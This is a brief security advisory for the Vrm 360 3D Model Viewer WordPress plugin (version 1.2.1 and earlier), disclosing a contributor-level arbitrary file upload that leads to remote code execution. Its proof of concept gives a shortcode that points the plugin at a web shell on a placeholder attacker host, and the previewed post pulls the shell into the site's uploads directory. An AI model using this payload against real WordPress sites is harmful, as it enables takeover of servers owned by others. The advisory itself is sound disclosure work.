## WordPress Plugin Vulnerabilities

# Vrm 360 3D Model Viewer <= 1.2.1 - Contributor+ Arbitrary File Upload Leading to RCE

### Description

The plugin is vulnerable to arbitrary file upload due to insufficient checks in a plugin shortcode.

### Proof of Concept

1. Host a webserver with a shell named `webshell.zip.php`
2. As a contributor, add the shortcode: `[vrm360 canvas\_name=s1 model\_url=http://ATTACKER\_HOST/webshell.zip.php aspect\_ratio=1.8 initial\_offset=0.9]`
3. Press "Preview" > "Preview in new tab"
4. See that the file has been uploaded to https://example.com/wp-content/uploads/tmp/webshell.zip.php
